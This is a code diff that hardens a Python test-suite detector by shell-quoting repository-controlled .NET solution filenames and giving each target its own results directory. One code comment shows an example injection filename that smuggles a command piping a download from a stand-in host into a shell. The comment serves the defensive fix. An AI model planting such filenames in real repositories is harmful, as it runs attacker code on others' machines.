@@ -84,6 +84,7 @@ from __future__ import annotations
 import argparse
 import json
 import re
+import shlex
 import subprocess
 import sys
 import xml.etree.ElementTree as ET
@@ -905,6 +906,11 @@ def _write_json(path: Path, data: dict) -> None:
     path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")
 
 
+def _slug(text: str) -> str:
+    """Filesystem-safe slug for a repo-controlled name used in a path."""
+    return re.sub(r"[^A-Za-z0-9._-]", "-", text).strip("-.") or "target"
+
+
 def _dotnet_suites(repo: Path) -> list[dict]:
     """Autodetected .NET suite(s), via the SAME ``chief_wiggum.verification``
     probe the adoption survey uses — so the survey's runner detection and the
@@ -926,23 +932,37 @@ def _dotnet_suites(repo: Path) -> list[dict]:
     det = verification.detect_project(repo)
     if not det.has_dotnet:
         return []
+    targets = verification.dotnet_test_targets(det.dotnet_solutions, det.dotnet_projects)
+    if not targets:
+        # Detected .NET, but no target `dotnet test` can actually run. Emitting
+        # a command known to fail would produce an empty pass-set that reads
+        # like a clean one — the #259 failure mode. Emit nothing; /status then
+        # reports the gap with a reason.
+        return []
 
-    def suite(name: str, results: str, target: str = "") -> dict:
+    def suite(name: str, results: str, target: str) -> dict:
+        # `run_suite` executes `cmd` through a shell, and every dynamic token
+        # here is a TARGET-REPO-CONTROLLED filename — adoption runs against
+        # third-party repos, so a solution named `x"; curl evil | sh; #.sln`
+        # would otherwise be executed verbatim. Quote every interpolation.
         return {
             "name": name,
-            "cmd": f"dotnet test{target} --logger trx --results-directory {results}",
+            "cmd": (f"dotnet test {shlex.quote(target)} --logger trx "
+                    f"--results-directory {shlex.quote(results)}"),
             "cwd": ".",
             "parser": "trx",
             "report": results,
         }
 
-    if len(det.dotnet_solutions) > 1:
-        return [
-            suite(f"dotnet-{stem}", f".ratchet-trx-{stem}", f' "{sln}"')
-            for sln, stem in ((s, Path(s).stem) for s in det.dotnet_solutions)
-        ]
-    target = f' "{det.dotnet_solutions[0]}"' if det.dotnet_solutions else ""
-    return [suite("dotnet", ".ratchet-trx", target)]
+    if len(targets) == 1:
+        return [suite("dotnet", ".ratchet-trx", targets[0])]
+    # Distinct, filesystem-safe results dirs: a shared one would let one
+    # target's pre-run clear delete another's results mid-score. The index
+    # keeps them unique even if two stems sanitize to the same string.
+    return [
+        suite(f"dotnet-{_slug(Path(t).stem)}", f".ratchet-trx-{i}-{_slug(Path(t).stem)}", t)
+        for i, t in enumerate(targets)
+    ]
 
 
 def detect_suites(repo: Path) -> list[dict]:
